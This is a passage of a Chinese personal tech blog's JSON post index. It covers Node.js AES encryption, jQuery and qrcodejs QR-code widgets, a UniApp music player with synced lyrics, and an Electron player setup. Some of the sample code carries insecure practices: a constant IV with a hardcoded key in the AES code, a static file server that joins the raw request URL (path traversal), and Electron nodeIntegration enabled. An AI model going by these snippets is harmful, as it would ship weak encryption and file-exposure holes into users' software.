与C#中相同的IV const cipher = crypto.createCipheriv(&#x27;aes-256-cbc&#x27;, Buffer.from(key), iv); let encrypted = cipher.update(plainText, &#x27;utf8&#x27;, &#x27;base64&#x27;); encrypted += cipher.final(&#x27;base64&#x27;); return encrypted;&#125;// 填充或截断密钥为32字节function padKey(key) &#123; return crypto.createHash(&#x27;sha256&#x27;).update(key).digest(); // 使用 SHA-256 将密钥处理成 32 字节&#125; AES-256-CBC 算法，密钥必须是 32 字节长。 可改为 AES-192AES-192-CBC 加密算法，该算法允许使用 24 字节的密钥。 12345678910111213141516171819202122232425262728293031323334const crypto = require(&#x27;crypto&#x27;);// 加密方法function encrypt(plainText, key) &#123; const iv = Buffer.from([1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 6]); const cipher = crypto.createCipheriv(&#x27;aes-192-cbc&#x27;, Buffer.from(key), iv); let encrypted = cipher.update(plainText, &#x27;utf8&#x27;, &#x27;base64&#x27;); encrypted += cipher.final(&#x27;base64&#x27;); return encrypted;&#125;// 解密方法function decrypt(cipherText, key) &#123; const iv = Buffer.from([1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2, 3, 4, 5, 6]); const decipher = crypto.createDecipheriv(&#x27;aes-192-cbc&#x27;, Buffer.from(key), iv); let decrypted = decipher.update(cipherText, &#x27;base64&#x27;, &#x27;utf8&#x27;); decrypted += decipher.final(&#x27;utf8&#x27;); return decrypted;&#125;// 测试例子const key = &#x27;thisisaverysecretkey12xx&#x27;; // 24字节的key（AES-192）const textToEncrypt = &#x27;88&#x27;;// 加密const encryptedText = encrypt(textToEncrypt, key);console.log(&#x27;加密后的文本:&#x27;, encryptedText);// 解密const decryptedText = decrypt(encryptedText, key);console.log(&#x27;解密后的文本:&#x27;, decryptedText);","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"node","slug":"node","permalink":"https://banjinmei.github.io/tags/node/"},{"name":"ase","slug":"ase","permalink":"https://banjinmei.github.io/tags/ase/"}],"author":"mu"},{"title":"js qrcode","slug":"js-qrcode","date":"2024-09-20T17:18:43.000Z","updated":"2024-12-10T12:52:02.214Z","comments":true,"path":"2024/09/21/js-qrcode/","permalink":"https://banjinmei.github.io/2024/09/21/js-qrcode/","excerpt":"","text":"qrcode12345678910111213141516&lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://cdn.staticfile.org/jquery.qrcode/1.0/jquery.qrcode.min.js&quot;&gt;&lt;/script&gt;&lt;div id=&quot;qrcode&quot; style=&quot;width: 200px; height: 200px;&quot;&gt;&lt;/div&gt;&lt;script&gt; $(document).ready(function () &#123; var qrData = &quot;https://www.qq.com?p=100&quot;; $(&quot;#qrcode&quot;).qrcode(&#123; width: 200, height: 200, text: qrData &#125;); &#125;);&lt;/script&gt; Node Server123456789101112131415161718192021222324252627282930313233const http = require(&#x27;http&#x27;);const fs = require(&#x27;fs&#x27;);const path = require(&#x27;path&#x27;);const server = http.createServer((req, res) =&gt; &#123; if (req.url === &#x27;/&#x27;) &#123; req.url = &#x27;/index.html&#x27;; &#125; const filePath = path.join(__dirname, &#x27;public&#x27;, req.url); fs.readFile(filePath, (err, content) =&gt; &#123; if (err) &#123; // 读取自定义的404页面 fs.readFile(path.join(__dirname, &#x27;public&#x27;, &#x27;404.html&#x27;), (err, content) =&gt; &#123; if (err) &#123; res.writeHead(500, &#123; &#x27;Content-Type&#x27;: &#x27;text/plain&#x27; &#125;); res.end(&#x27;500 Internal Server Error&#x27;); &#125; else &#123; res.writeHead(404, &#123; &#x27;Content-Type&#x27;: &#x27;text/html&#x27; &#125;); res.end(content); &#125; &#125;); &#125; else &#123; res.writeHead(200, &#123; &#x27;Content-Type&#x27;: &#x27;text/html&#x27; &#125;); res.end(content); &#125; &#125;);&#125;);server.listen(process.env.PORT || 3919, &#x27;localhost&#x27;, () =&gt; &#123; console.log(`server listen at: $&#123;process.env.PORT || 3919&#125;`);&#125;); &#x2F;public&#x2F;index.html 1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Generate QR Code&lt;/title&gt; &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.staticfile.org/jquery.qrcode/1.0/jquery.qrcode.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt;&lt;body&gt; &lt;div id=&quot;qrcode&quot; style=&quot;width: 200px; height: 200px;&quot;&gt;&lt;/div&gt; &lt;script&gt; $(document).ready(function () &#123; var qrData = &quot;https://www.qq.com?p=100&quot;; $(&quot;#qrcode&quot;).qrcode(&#123; width: 200, height: 200, text: qrData &#125;); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 自定义123&lt;input type=&quot;text&quot; id=&quot;qrInput&quot; placeholder=&quot;data...&quot;&gt; &lt;button id=&quot;generateQR&quot;&gt;Generate&lt;/button&gt; &lt;div id=&quot;qrcode&quot; style=&quot;width: 200px; height: 200px;&quot;&gt;&lt;/div&gt; 1234567891011121314$(&#x27;#generateQR&#x27;).click(function () &#123; $(&quot;#qrcode&quot;).empty(); // 清空之前的二维码 var qrData = $(&#x27;#qrInput&#x27;).val(); // 获取输入框中的值 if (qrData) &#123; $(&quot;#qrcode&quot;).qrcode(&#123; width: 200, // 设置宽度 height: 200, // 设置高度 text: qrData // 设置二维码的内容 &#125;); &#125; else &#123; alert(&#x27;请输入要生成的二维码内容&#x27;); &#125; &#125;); url 添加二维码12345678910111213141516171819202122&lt;div class=&quot;url-card col-6 col-sm-6 col-md-4 col-xl-5a col-xxl-6a&quot;&gt; &lt;div class=&quot;url-body default&quot;&gt; &lt;a href=&quot;https://www.yuque.com/&quot; target=&quot;_blank&quot; data-id=&quot;&quot; data-url=&quot;https://www.yuque.com/&quot; class=&quot;card no-c mb-4&quot; data-toggle=&quot;tooltip&quot; data-placement=&quot;bottom&quot; data-original-title=&quot;专业的云端知识库。&quot;&gt; &lt;div class=&quot;card-body&quot;&gt; &lt;div class=&quot;url-content d-flex align-items-center&quot;&gt; &lt;div class=&quot;url-img mr-2 d-flex align-items-center justify-content-center&quot;&gt; &lt;img class=&quot;lazy loaded&quot; src=&quot;assets/images/logos/%e8%af%ad%e9%9b%80.webp&quot; data-src=&quot;assets/images/logos/%e8%af%ad%e9%9b%80.webp&quot; onerror=&quot;javascript:this.src=&#x27;assets\\/images\\/logos\\/default.webp&#x27;&quot; alt=&quot;语雀&quot; data-was-processed=&quot;true&quot;&gt; &lt;/div&gt; &lt;div class=&quot;url-info flex-fill&quot;&gt; &lt;div class=&quot;text-sm overflowClip_1&quot;&gt; &lt;strong&gt;语雀&lt;/strong&gt; &lt;/div&gt; &lt;p class=&quot;overflowClip_1 m-0 text-muted text-xs&quot;&gt;专业的云端知识库。&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/a&gt; &lt;a href=&quot;https://www.yuque.com/&quot; class=&quot;togo text-center text-muted is-views&quot; data-id=&quot;689&quot; data-toggle=&quot;tooltip&quot; data-placement=&quot;right&quot; title=&quot;&quot; rel=&quot;nofollow&quot; data-original-title=&quot;直达&quot;&gt; &lt;i class=&quot;iconfont icon-goto&quot;&gt;&lt;/i&gt; &lt;/a&gt; &lt;/div&gt; &lt;/div&gt; 添加个按钮，移动上去则 为 data-url&#x3D;”” 生成二维码 并展示，移出则消失。以下是使用 HTML、JavaScript 和一个常用的二维码生成库（这里以qrcodejs2为例，需要引入其相关的库文件，可以通过 CDN 引入 ）来实现需求的代码示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;语雀二维码生成示例&lt;/title&gt; &lt;!-- 引入二维码生成库（这里以qrcodejs2为例，实际使用时确保能正确引入该库文件） --&gt; &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js&quot;&gt;&lt;/script&gt; &lt;style&gt; /* 简单样式，用于展示二维码的容器 */ .qrcode-container &#123; display: none; position: absolute; border: 1px solid #ccc; padding: 10px; background-color: white; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;url-card col-6 col-sm-6 col-md-4 col-xl-5a col-xxl-6a&quot;&gt; &lt;div class=&quot;url-body default&quot;&gt; &lt;a href=&quot;https://www.yuque.com/&quot; target=&quot;_blank&quot; data-id=&quot;&quot; data-url=&quot;https://www.yuque.com/&quot; class=&quot;card no-c mb-4&quot; data-toggle=&quot;tooltip&quot; data-placement=&quot;bottom&quot; data-original-title=&quot;专业的云端知识库。&quot;&gt; &lt;div class=&quot;card-body&quot;&gt; &lt;div class=&quot;url-content d-flex align-items-center&quot;&gt; &lt;div class=&quot;url-img mr-2 d-flex align-items-center justify-content-center&quot;&gt; &lt;img class=&quot;lazy loaded&quot; src=&quot;assets/images/logos/%e8%af%ad%e9%9b%80.webp&quot; data-src=&quot;assets/images/logos/%e8%af%ad%e9%9b%80.webp&quot; onerror=&quot;javascript:this.src=&#x27;assets\\/images\\/logos\\/default.webp&#x27;&quot; alt=&quot;语雀&quot; data-was-processed=&quot;true&quot;&gt; &lt;/div&gt; &lt;div class=&quot;url-info flex-fill&quot;&gt; &lt;div class=&quot;text-sm overflowClip_1&quot;&gt; &lt;strong&gt;语雀&lt;/strong&gt; &lt;/div&gt; &lt;p class=&quot;overflowClip_1 m-0 text-muted text-xs&quot;&gt;专业的云端知识库。&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/a&gt; &lt;a href=&quot;https://www.yuque.com/&quot; class=&quot;togo text-center text-muted is-views&quot; data-id=&quot;689&quot; data-toggle=&quot;tooltip&quot; data-placement=&quot;right&quot; title=&quot;&quot; rel=&quot;nofollow&quot; data-original-title=&quot;直达&quot;&gt; &lt;i class=&quot;iconfont icon-goto&quot;&gt;&lt;/i&gt; &lt;/a&gt; &lt;!-- 添加按钮 --&gt; &lt;button id=&quot;generate-qr-btn&quot;&gt;生成语雀二维码&lt;/button&gt; &lt;!-- 用于展示二维码的容器 --&gt; &lt;div id=&quot;qrcode-container&quot; class=&quot;qrcode-container&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; JavaScript 部分 123456789101112131415161718window.onload = function () &#123; const generateBtn = document.getElementById(&#x27;generate-qr-btn&#x27;); const qrCodeContainer = document.getElementById(&#x27;qrcode-container&#x27;); const targetLink = document.querySelector(&#x27;a[href=&quot;https://www.yuque.com/&quot;]&#x27;).dataset.url; generateBtn.addEventListener(&#x27;mouseover&#x27;, function () &#123; const qrcode = new QRCode(qrCodeContainer, &#123; text: targetLink, width: 128, height: 128 &#125;); qrCodeContainer.style.display = &#x27;block&#x27;; &#125;); generateBtn.addEventListener(&#x27;mouseout&#x27;, function () &#123; qrCodeContainer.style.display = &#x27;none&#x27;; &#125;);&#125;; 上述代码的实现步骤如下：HTML 结构调整：在原有的 HTML 结构基础上，添加了一个按钮元素，其id为generate-qr-btn，用于触发二维码生成的交互操作。同时添加了一个div元素作为二维码展示的容器，其id为qrcode-container，并通过 CSS 设置初始状态为不显示（display: none）。JavaScript 逻辑：页面加载完成后（通过window.onload事件），获取按钮元素和二维码容器元素以及目标链接（从对应a标签的data-url属性获取）。给按钮添加mouseover（鼠标移入）事件监听器，在事件处理函数中，使用qrcodejs2库创建一个二维码实例，并将目标链接作为要编码的内容传入，设置好合适的宽度和高度（这里示例为 128px），同时将二维码容器的display属性设置为block使其显示出来。 data-target-url&#x3D;1234567891011121314151617181920212223242526272829303132333435&lt;div class=&quot;url-card col-6 col-sm-6 col-md-4 col-xl-5a col-xxl-6a&quot;&gt; &lt;div class=&quot;url-body default&quot;&gt; &lt;a href=&quot;https://www.yuque.com/&quot; target=&quot;_blank&quot; data-id=&quot;&quot; data-url=&quot;https://www.yuque.com/&quot; class=&quot;card no-c mb-4&quot; data-toggle=&quot;tooltip&quot; data-placement=&quot;bottom&quot; data-original-title=&quot;专业的云端知识库。&quot;&gt; &lt;div class=&quot;card-body&quot;&gt; &lt;div class=&quot;url-content d-flex align-items-center&quot;&gt; &lt;div class=&quot;url-img mr-2 d-flex align-items-center justify-content-center&quot;&gt; &lt;img class=&quot;lazy loaded&quot; src=&quot;./We1_files/images/logos/%e8%af%ad%e9%9b%80.webp&quot; data- src=&quot;./We1_files/images/logos/%e8%af%ad%e9%9b%80.webp&quot; alt=&quot;语雀&quot; data-was-processed=&quot;true&quot;&gt; &lt;/div&gt; &lt;div class=&quot;url-info flex-fill&quot;&gt; &lt;div class=&quot;text-sm overflowClip_1&quot;&gt; &lt;strong&gt;语雀&lt;/strong&gt; &lt;/div&gt; &lt;p class=&quot;overflowClip_1 m-0 text-muted text-xs&quot;&gt;专业的云端知识库。&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/a&gt; &lt;!-- 添加按钮，并添加自定义属性data-target-url来指定要生成二维码的目标链接 --&gt; &lt;button id=&quot;generate-qr-btn&quot; data-target-url=&quot;https://www.yuque.com/&quot;&gt;生成语雀二维码&lt;/button&gt; &lt;!-- 用于展示二维码的容器 --&gt; &lt;div id=&quot;qrcode-container&quot; class=&quot;qrcode-container&quot;&gt;&lt;/div&gt; &lt;a href=&quot;https://www.yuque.com/&quot; class=&quot;togo text-center text-muted is-views&quot; data-id=&quot;689&quot; data-toggle=&quot;tooltip&quot; data-placement=&quot;right&quot; title=&quot;&quot; rel=&quot;nofollow&quot; data-original-title=&quot;直达&quot;&gt; &lt;i class=&quot;iconfont icon-goto&quot;&gt;&lt;/i&gt; &lt;/a&gt; &lt;/div&gt;&lt;/div&gt;&lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt; 12345678910111213141516171819window.onload = function () &#123; const generateBtn = document.getElementById(&#x27;generate-qr-btn&#x27;); const qrCodeContainer = document.getElementById(&#x27;qrcode-container&#x27;); generateBtn.addEventListener(&#x27;mouseover&#x27;, function () &#123; // 从按钮的自定义属性data-target-url获取要生成二维码的目标链接 const targetLink = generateBtn.dataset.targetUrl; const qrcode = new QRCode(qrCodeContainer, &#123; text: targetLink, width: 128, height: 128 &#125;); qrCodeContainer.style.display = &#x27;block&#x27;; &#125;); generateBtn.addEventListener(&#x27;mouseout&#x27;, function () &#123; qrCodeContainer.style.display = &#x27;none&#x27;; &#125;);&#125;; 在按钮元素上新增了一个自定义属性data-target-url，并将需要生成二维码对应的目标链接（这里是语雀官网链接）赋值给该属性。这样，在不同的场景下，如果要为其他链接生成二维码，只需要修改按钮这个自定义属性的值即可，而不需要去修改 JavaScript 代码中选择元素获取链接的逻辑。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"jquery","slug":"jquery","permalink":"https://banjinmei.github.io/tags/jquery/"},{"name":"qrcode","slug":"qrcode","permalink":"https://banjinmei.github.io/tags/qrcode/"}],"author":"mu"},{"title":"electron uniapp mp3","slug":"electron-uniapp-mp3","date":"2024-09-19T15:29:51.000Z","updated":"2024-09-20T17:43:43.239Z","comments":true,"path":"2024/09/19/electron-uniapp-mp3/","permalink":"https://banjinmei.github.io/2024/09/19/electron-uniapp-mp3/","excerpt":"","text":"前言音乐APP版权&#x2F;广告问题，让听歌体验很差，所以自己整个简单的播放器~ Uniapp MP31. 创建项目在 HBuilderX 中，新建一个 UniApp 项目，项目结构如下： 123456- pages/ - index/ - index.vue- static/- manifest.json- pages.json 2. 页面设计和逻辑index.vue 文件在 pages&#x2F;index&#x2F;index.vue 文件中实现播放器的界面和逻辑： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697&lt;template&gt; &lt;view class=&quot;container&quot;&gt; &lt;text class=&quot;title&quot;&gt;UniApp 音乐播放器&lt;/text&gt; &lt;view class=&quot;controls&quot;&gt; &lt;button @click=&quot;prevTrack&quot;&gt;上一首&lt;/button&gt; &lt;button @click=&quot;playPause&quot;&gt;&#123;&#123; isPlaying ? &#x27;暂停&#x27; : &#x27;播放&#x27; &#125;&#125;&lt;/button&gt; &lt;button @click=&quot;nextTrack&quot;&gt;下一首&lt;/button&gt; &lt;/view&gt; &lt;text&gt;&#123;&#123; currentTrack.name &#125;&#125;&lt;/text&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; audioContext: null, isPlaying: false, currentTrackIndex: 0, tracks: [ &#123; name: &#x27;歌曲 1&#x27;, url: &#x27;https://example.com/song1.mp3&#x27; &#125;, &#123; name: &#x27;歌曲 2&#x27;, url: &#x27;https://example.com/song2.mp3&#x27; &#125;, &#123; name: &#x27;歌曲 3&#x27;, url: &#x27;https://example.com/song3.mp3&#x27; &#125; ] &#125; &#125;, computed: &#123; currentTrack() &#123; return this.tracks[this.currentTrackIndex]; &#125; &#125;, methods: &#123; playPause() &#123; if (this.isPlaying) &#123; this.audioContext.pause(); &#125; else &#123; this.audioContext.src = this.currentTrack.url; this.audioContext.play(); &#125; this.isPlaying = !this.isPlaying; &#125;, prevTrack() &#123; this.currentTrackIndex = (this.currentTrackIndex - 1 + this.tracks.length) % this.tracks.length; this.playTrack(); &#125;, nextTrack() &#123; this.currentTrackIndex = (this.currentTrackIndex + 1) % this.tracks.length; this.playTrack(); &#125;, playTrack() &#123; this.isPlaying = false; this.playPause(); &#125; &#125;, onReady() &#123; this.audioContext = uni.createInnerAudioContext(); &#125;, onUnload() &#123; this.audioContext.destroy(); &#125;&#125;&lt;/script&gt;&lt;style&gt;.container &#123; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;&#125;.title &#123; font-size: 24px; margin-bottom: 20px;&#125;.controls &#123; display: flex; justify-content: space-around; width: 80%; margin-bottom: 20px;&#125;button &#123; padding: 10px 20px; background-color: #007AFF; color: white; border: none; border-radius: 5px; font-size: 16px;&#125;text &#123; font-size: 18px;&#125;&lt;/style&gt; ios ​ 3. 配置 Android 权限在 manifest.json 文件中，确保配置了音频播放所需的权限： 123456789101112&#123; &quot;app-plus&quot;: &#123; &quot;distribute&quot;: &#123; &quot;android&quot;: &#123; &quot;permissions&quot;: [ &quot;android.permission.INTERNET&quot;, &quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; ] &#125; &#125; &#125;&#125; 4. 打包 APK打开 HBuilderX，点击“发行” -&gt; “原生App-云打包”。选择平台为 Android，填写应用信息（包名、签名等）。上传图标等资源，完成打包。打包后获得 .apk 文件，可以安装到安卓设备上&#x2F;模拟器进行测试。 &#x2F;unpackage&#x2F;release&#x2F;apk&#x2F;__UNI_XXX.apkandroid​ 5.歌曲列表123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191&lt;template&gt; &lt;view class=&quot;container&quot;&gt; &lt;!-- 居中显示歌曲图片 --&gt; &lt;view class=&quot;cover-container&quot;&gt; &lt;image class=&quot;cover&quot; :src=&quot;currentSong.img&quot; mode=&quot;aspectFill&quot;&gt;&lt;/image&gt; &lt;/view&gt; &lt;!-- 显示歌曲名 --&gt; &lt;text class=&quot;title&quot;&gt;&#123;&#123; currentSong.name &#125;&#125;&lt;/text&gt; &lt;!-- 自动滚动的歌词 --&gt; &lt;scroll-view class=&quot;lyrics&quot; scroll-y :scroll-top=&quot;scrollTop&quot; :scroll-with-animation=&quot;true&quot;&gt; &lt;view v-for=&quot;(line, index) in lyrics&quot; :key=&quot;index&quot; :class=&quot;&#123;&#x27;active-lyric&#x27;: currentLyricIndex === index, &#x27;lyric&#x27;: true&#125;&quot;&gt; &#123;&#123; line.text &#125;&#125; &lt;/view&gt; &lt;/scroll-view&gt; &lt;!-- 播放控制按钮 --&gt; &lt;view class=&quot;controls&quot;&gt; &lt;button @click=&quot;prevSong&quot;&gt;上一曲&lt;/button&gt; &lt;button @click=&quot;togglePlay&quot;&gt;&#123;&#123; isPlaying ? &#x27;暂停&#x27; : &#x27;播放&#x27; &#125;&#125;&lt;/button&gt; &lt;button @click=&quot;nextSong&quot;&gt;下一曲&lt;/button&gt; &lt;/view&gt; &lt;!-- 播放列表 --&gt; &lt;view class=&quot;playlist&quot;&gt; &lt;text v-for=&quot;(song, index) in playlist&quot; :key=&quot;index&quot; @click=&quot;playSong(song)&quot;&gt; &#123;&#123; song.name &#125;&#125; &lt;/text&gt; &lt;/view&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; currentSong: &#123; name: &#x27;song1&#x27;, img: &#x27;/static/song1.jpg&#x27;, audio: &#x27;/static/song1.mp3&#x27;, lrc: &#x27;/static/song1.lrc&#x27;, &#125;, isPlaying: false, audioPlayer: null, playlist: [ &#123; name: &#x27;song1&#x27;, img: &#x27;/static/song1.jpg&#x27;, audio: &#x27;/static/song1.mp3&#x27;, lrc: &#x27;/static/song1.lrc&#x27; &#125;, &#123; name: &#x27;song2&#x27;, img: &#x27;/static/song2.jpg&#x27;, audio: &#x27;/static/song2.mp3&#x27;, lrc: &#x27;/static/song2.lrc&#x27; &#125;, ], lyrics: [], // 歌词行 currentLyricIndex: 0, // 当前歌词索引 scrollTop: 0, // 歌词滚动位置 audioDuration: 0, // 音频总时长 &#125;; &#125;, methods: &#123; loadLyrics(lrcFile) &#123; // 加载歌词文件并解析 uni.request(&#123; url: lrcFile, success: (res) =&gt; &#123; const lrcLines = res.data.split(&#x27;\\n&#x27;); // 更新正则表达式以处理不同格式的时间戳 this.lyrics = lrcLines.map(line =&gt; &#123; const match = line.match(/\\[(\\d&#123;2&#125;):(\\d&#123;2&#125;)(?:\\.(\\d&#123;1,3&#125;))?\\](.*)/); if (match) &#123; const minutes = parseInt(match[1]); const seconds = parseInt(match[2]); const milliseconds = match[3] ? parseInt(match[3].padEnd(3, &#x27;0&#x27;)) : 0; // 补全毫秒到三位数 const time = minutes * 60 + seconds + milliseconds / 1000; return &#123; time, text: match[4] &#125;; &#125; return &#123; time: 0, text: line &#125;; &#125;); &#125;, &#125;); &#125;, playSong(song) &#123; // 停止当前播放的音乐 if (this.audioPlayer) &#123; this.audioPlayer.stop(); &#125; // 切换到选中的歌曲 this.currentSong = song; this.loadLyrics(song.lrc); this.audioPlayer = uni.createInnerAudioContext(); this.audioPlayer.src = song.audio; this.audioPlayer.play(); this.isPlaying = true; // 监听播放进度 this.audioPlayer.onTimeUpdate(() =&gt; &#123; this.updateLyric(); &#125;); // 监听播放结束 this.audioPlayer.onEnded(() =&gt; &#123; this.nextSong(); &#125;); &#125;, togglePlay() &#123; if (this.isPlaying) &#123; this.audioPlayer.pause(); &#125; else &#123; this.audioPlayer.play(); &#125; this.isPlaying = !this.isPlaying; &#125;, prevSong() &#123; const currentIndex = this.playlist.findIndex(song =&gt; song.name === this.currentSong.name); const prevIndex = (currentIndex - 1 + this.playlist.length) % this.playlist.length; this.playSong(this.playlist[prevIndex]); &#125;, nextSong() &#123; const currentIndex = this.playlist.findIndex(song =&gt; song.name === this.currentSong.name); const nextIndex = (currentIndex + 1) % this.playlist.length; this.playSong(this.playlist[nextIndex]); &#125;, updateLyric() &#123; const currentTime = this.audioPlayer.currentTime; for (let i = 0; i &lt; this.lyrics.length; i++) &#123; if (i === this.lyrics.length - 1 || (currentTime &gt;= this.lyrics[i].time &amp;&amp; currentTime &lt; this.lyrics[i + 1].time)) &#123; this.currentLyricIndex = i; this.scrollTop = i * 40; // 滚动到当前歌词 break; &#125; &#125; &#125; &#125;, mounted() &#123; // 默认加载第一首歌的歌词 this.loadLyrics(this.currentSong.lrc); // 创建音频播放器 this.audioPlayer = uni.createInnerAudioContext(); this.audioPlayer.src = this.currentSong.audio; &#125;, beforeDestroy() &#123; if (this.audioPlayer) &#123; this.audioPlayer.destroy(); &#125; &#125;&#125;;&lt;/script&gt;&lt;style&gt;.container &#123; padding: 20px;&#125;.cover-container &#123; display: flex; justify-content: center; align-items: center;&#125;.cover &#123; width: 280px; height: 280px; border-radius: 10px;&#125;.title &#123; font-size: 24px; text-align: center; margin: 10px 0;&#125;.lyrics &#123; height: 150px; overflow-y: auto; margin: 20px 0; border: 1px solid #ddd; padding: 10px;&#125;.lyric &#123; font-size: 16px; line-height: 40px;&#125;.active-lyric &#123; color: #ff4081; font-weight: bold;&#125;.controls &#123; display: flex; justify-content: space-between;&#125;.playlist &#123; margin-top: 20px;&#125;.playlist text &#123; cursor: pointer; display: block; margin: 5px 0;&#125;&lt;/style&gt; 6.歌曲高亮1234567:class=&quot;&#123;&#x27;active-song&#x27;: song.name === currentSong.name&#125;css .active-song &#123; color: #ff4081; font-weight: bold;&#125; 7.歌词显示上一行1234567//loadLyrics // 移除最后一行（第四行） if (this.lyrics.length &gt; 3) &#123; this.lyrics.pop(); &#125;//updateLyric this.scrollTop = (i - 1) * 40; // 滚动位置调整到前一行，确保前一行也能显示 8.请求服务器data.js加载曲目12345678910111213141516171819202122//load uni.request(&#123; url: &#x27;http://xxx:8080/group1/mpdata/dt/datajsonuni2.js?download=0&#x27;, method: &#x27;GET&#x27;, success: (res) =&gt; &#123; if (res.statusCode === 200) &#123; console.log(res); this.playlist = res.data; // 默认加载第一首歌的信息 this.currentSong = this.playlist[0]; this.loadLyrics(this.currentSong.lrc); // 创建音频播放器 this.audioPlayer = uni.createInnerAudioContext(); this.audioPlayer.src = this.currentSong.audio; &#125; else &#123; console.error(&#x27;Failed to fetch playlist data&#x27;); &#125; &#125;, fail: () =&gt; &#123; console.error(&#x27;Request failed&#x27;); &#125; &#125;); 9.playlist太多处理固定高度 滑动 1234567.playlist &#123; margin-top: 20px; height:160px; overflow-y: auto; &#125; 这样一个建议的音乐播放器就ok了~ electron版本1. 初始化项目使用 npm init 命令创建 package.json 文件： 1npm init -y 这将创建一个默认的 package.json 文件。 2. 安装 Electron使用 npm 安装 Electron： 1npm install electron --save-dev 3.Electron主进程main.js 12345678910111213141516171819202122232425262728293031323334353637383940const &#123; app, BrowserWindow, dialog &#125; = require(&#x27;electron&#x27;);const path = require(&#x27;path&#x27;);let win;function createWindow () &#123; win = new BrowserWindow(&#123; width: 800, height: 600, webPreferences: &#123; preload: path.join(__dirname, &#x27;preload.js&#x27;), nodeIntegration: true, // 允许在渲染进程中使用 Node.js API &#125; &#125;); // 加载 index.html win.loadFile(&#x27;index.html&#x27;); // 打开开发者工具（可选） win.webContents.openDevTools(); win.on(&#x27;closed&#x27;, () =&gt; &#123; win = null; &#125;);&#125;app.whenReady().then(createWindow);app.on(&#x27;window-all-closed&#x27;, () =&gt; &#123; if (process.platform !== &#x27;darwin&#x27;) &#123; app.quit(); &#125;&#125;);app.on(&#x27;activate&#x27;, () =&gt; &#123; if (BrowserWindow.getAllWindows().length === 0) &#123; createWindow(); &#125;&#125;); 4.前端 创建 index.html 文件作为音乐播放器的界面。 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt; M Player&lt;/title&gt; &lt;style&gt; body &#123; font-family: Arial, sans-serif; text-align: center; &#125; .player &#123; margin-top: 50px; &#125; audio &#123; width: 100%; margin-top: 20px; &#125; button &#123; margin: 5px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Simple Music Player&lt;/h1&gt; &lt;div class=&quot;player&quot;&gt; &lt;input type=&quot;file&quot; id=&quot;fileInput&quot; accept=&quot;audio/*&quot; /&gt; &lt;audio id=&quot;audioPlayer&quot; controls&gt; Your browser does not support the audio element. &lt;/audio&gt; &lt;br/&gt; &lt;button id=&quot;prevBtn&quot;&gt;Previous&lt;/button&gt; &lt;button id=&quot;nextBtn&quot;&gt;Next&lt;/button&gt; &lt;/div&gt; &lt;script src=&quot;renderer.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 5.创建渲染进程脚本 renderer.js这个文件处理前端逻辑，包括加载音乐文件、播放、暂停、切换曲目等功能。 123456789101112131415161718192021222324252627282930313233343536373839404142434445const audioPlayer = document.getElementById(&#x27;audioPlayer&#x27;);const fileInput = document.getElementById(&#x27;fileInput&#x27;);const prevBtn = document.getElementById(&#x27;prevBtn&#x27;);const nextBtn = document.getElementById(&#x27;nextBtn&#x27;);let playlist = [];let currentTrackIndex = 0;// 当选择音乐文件时，加载并播放fileInput.addEventListener(&#x27;change&#x27;, (event) =&gt; &#123; const files = event.target.files; if (files.length &gt; 0) &#123; playlist = Array.from(files); currentTrackIndex = 0; loadTrack(currentTrackIndex); &#125;&#125;);// 加载并播放指定索引的歌曲function loadTrack(index) &#123; const track = playlist[index]; if (track) &#123; const url = URL.createObjectURL(track); audioPlayer.src = url; audioPlayer.play(); &#125;&#125;// 